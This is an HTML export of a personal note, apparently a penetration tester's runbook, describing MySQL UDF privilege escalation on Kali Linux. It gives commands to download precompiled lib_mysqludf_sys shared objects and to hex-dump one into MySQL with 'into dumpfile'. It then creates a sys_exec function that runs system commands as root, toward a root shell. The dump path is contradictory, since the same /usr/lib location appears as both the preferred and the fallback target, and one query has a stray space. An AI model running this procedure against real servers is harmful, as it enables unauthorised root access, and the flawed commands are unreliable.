<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>PRIVILIGE_ESCALATION</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>PRIVILIGE_ESCALATION</h1><br/><strong><h3># MYSQL UDF EXPLOITATION</h3></strong> {<span style="color:#ff0000;">explicitly</span>: <span style="color:#00ff00;">Kali Linux</span> }<br /><br /><br /><strong><span style="background-color:#7f7f7f;">• For this exploit to work we need to have access to MYSQL server as the root user</span></strong><br /><br />once this requirement is statisfied we can continue with the exploitation.<br /><br /><br /><strong><span style="background-color:#ff0000;"># Confirming the Dependencies</span></strong><br /><br />Before we can start the exploitation , we need to install some dev libraries for mysql.<br /><br /><strong><span style="background-color:#7f7f7f;">commands: </span></strong><br /><br />	<em><strong><span style="color:#1a1a1a;">→ apt update<br />	→ apt install default-libmysqld-dev<br />	→ apt install default-libmysqlclient-dev</span></strong></em><br /><br /><strong><span style="color:#f04929;">now we can begin the exploitation phase.</span></strong><br /><br /><strong><span style="background-color:#bc077c;"># Compiling the Shared so library</span></strong><br /><br /><span style="color:#1a1a1a;">Before we can compile the shared library we need to confirm the architecture of our target system....which on linux we can confirm using the arch command</span><br /><br />[<strong><span style="color:#1a1a1a;">The compile versions of the library are also present in the repo</span></strong>]<br /><br /><br /><br /><strong><span style="background-color:#ff0000;">• For 64-bit arch</span></strong><br /><br />→ <strong><span style="color:#7f7f7f;">First we need to Download the source code Files for so library </span></strong><br /><br /><strong><span style="color:#7f7f7f;">command</span></strong><span style="color:#7f7f7f;">:</span> <span style="color:#ff0000;">wget</span> <a href="https://github.com/SxNade/MYSQL_UDF_exploit/raw/main/mysql_udf_files.zip">https://github.com/SxNade/MYSQL_UDF_exploit/raw/main/mysql_udf_files.zip</a><br /><br /><strong>This zip File contains the source code file for so library</strong> , the source code is taken from <a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a><br /><br />once we download the zip file and then extract the zip file we will run the make command to compile the so named <strong><span style="color:#ff0000;">lib_mysqludf_sys.so</span></strong><br /><br /><strong><span style="background-color:#ff0000;">• For 32-bit arch</span></strong><br /><br />→ <strong><span style="color:#7f7f7f;"> we need to follow similar approach but this time we will download the 32-bit{yeah just a minor change to MakeFile} zip file<br /><br />command: </span></strong><strong><span style="color:#ff0000;">wget</span></strong><strong> </strong><a href="https://github.com/SxNade/MYSQL_UDF_exploit/raw/main/mysql_32bit_udf_files.zip">https://github.com/SxNade/MYSQL_UDF_exploit/raw/main/mysql_32bit_udf_files.zip</a><strong><br /></strong><br />Again we will extract this and then Run the make command to compile the so for 32-bit arch<br /><br /><br /><strong><span style="background-color:#a020f0;"># Precompiled so&#39;s</span></strong><br /><br />The repoisitory also contains precompiled so&#39;s which can be download as Follows<br /><br /><strong>• For 64-bit arch</strong><br /><br /><span style="color:#7f7f7f;">command:</span> wget <a href="https://github.com/SxNade/MYSQL_UDF_exploit/raw/main/mysql_udf_64.so">https://github.com/SxNade/MYSQL_UDF_exploit/raw/main/mysql_udf_64.so</a><br /><br /><strong>• For 32-bit arch</strong><br /><br /><span style="color:#7f7f7f;">command:</span> wget <a href="https://github.com/SxNade/MYSQL_UDF_exploit/raw/main/mysql_udf_32.so">https://github.com/SxNade/MYSQL_UDF_exploit/raw/main/mysql_udf_32.so</a><br /><br /><strong><span style="background-color:#bc077c;"># Making the MYSQL userdefined Function</span></strong><br /><br />We Login into the Mysql instance as the root user<br /><br /><a href=""><img src="images/44-1.png" alt="images/44-1.png" /></a><br /><br />now we will make a hex dump of the Shared library we compiled and then<br /><br />⇒ HexDump: <span style="color:#00ff00;">xxd -p mysql_udf[32/64].so | tr -d &#39;\n&#39; &gt; mysql_udf[32/64].so.hex</span><br />⇒ Copy: <span style="color:#00ff00;">cat mysql_udf[32/64].so.hex | xclip -selection clipboard</span><br /><br />we have the hex dump of shared library copied to our clipboard...<br /><br /><span style="color:#7f7f7f;">Now we will move onto making the mysql user defined function for furthur exploitation of the system</span><br /><br /><br /><span style="color:#7f7f7f;">• Make a Shell variable</span> <span style="color:#ff0000;">containing hex code</span><br /><br />⇒ <span style="color:#1e90ff;">set @shell</span><span style="color:#00ff00;"> </span><span style="color:#7f7f7f;">=</span> <span style="color:#ff0000;">0x</span><span style="color:#00ff00;">&lt;contents we copied from so&gt;</span><span style="color:#ff0000;">;</span>   {<span style="color:#1e90ff;">notice we appended ‘0x’ in start and ‘;’ at end</span>}<br /><br /><a href=""><img src="images/44-2.png" alt="images/44-2.png" /></a><br />{<span style="color:#ff0000;">truncated</span>}<br /><a href=""><img src="images/44-3.png" alt="images/44-3.png" /></a><br /><br /><br /><span style="color:#7f7f7f;">• Dumping the contents of shell variable</span> <span style="color:#ff0000;">into a shared object</span> <span style="color:#7f7f7f;">File</span> <br /><br />• Note::--&gt;<br /><br />In the dumping step we will start by dumping the File into a location We will find by running the Query<br /><br /><strong>SELECT @@plugin_dir</strong>;<br /><br /><a href=""><img src="images/44-4.png" alt="images/44-4.png" /></a><br /><br /><br />and we can see that we got <strong><span style="color:#ff0000;">/usr/lib/mysql/plugin</span></strong>. we will dump the so into this Dir {<span style="color:#ff0000;">which is what we currently have</span>}<br /><br />⇒ <span style="color:#1e90ff;">select binary</span> <span style="color:#ff0000;">@shell</span> <span style="color:#00ff00;">into dumpfile</span> &#39;<span style="color:#1e90ff;">/usr/lib/mysql_udf_[64/32].so</span>&#39;;<br /><br />• However if it does not work then we will dump the so in the Default /usr/lib dir as shown below<br /><br />⇒ <span style="color:#1e90ff;">select binary</span> <span style="color:#ff0000;">@shell</span> <span style="color:#00ff00;">into dumpfile</span> &#39;<span style="color:#1e90ff;">/usr/lib/mysql_udf_[64/32].so</span>&#39;;<br /><br />After we are done with the Dump<br /><br /><span style="color:#7f7f7f;">• Creating the Custom Function which executes</span> <span style="color:#ff0000;">system commands</span> <span style="color:#00ff00;">as root</span><br /><br />⇒ <span style="color:#1e90ff;">create function</span> <span style="color:#ff0000;">sys_exec</span> <span style="color:#1e90ff;">returns int soname</span> &#39;<span style="color:#00ff00;">mysql_udf_[64/32].so</span>&#39;;<br /><br /><br /><a href=""><img src="images/44-5.png" alt="images/44-5.png" /></a><br /><br /><br />Now once the Function is created we can check if it was created or not using the Following Query.<br /><br /><span style="color:#1a1a1a;">Query:</span> <span style="color:#ff0000;">SELECT</span> * <span style="color:#ffa500;">FROM</span> <span style="color:#00ff00;">mysql.func</span>;<br /><br /><a href=""><img src="images/44-6.png" alt="images/44-6.png" /></a><br /><br />Once we have confirmed the existence we can execute system commands using....<br /><br /><span style="color:#1a1a1a;">Query:</span> <span style="color:#ff0000;">SELECT</span> <span style="color:#00ff00;">mysql. sys_exec(&#39;</span><span style="color:#ff0000;">command-to-execute</span><span style="color:#00ff00;">&#39;)</span>;<br /><br /><br />We can use this Furthur get a root shell...may be as follows<br /><a href=""><img src="images/44-7.png" alt="images/44-7.png" /></a><br /><br />• From our shell access<br /><br /><a href=""><img src="images/44-8.png" alt="images/44-8.png" /></a><br /><br /></div></body></html>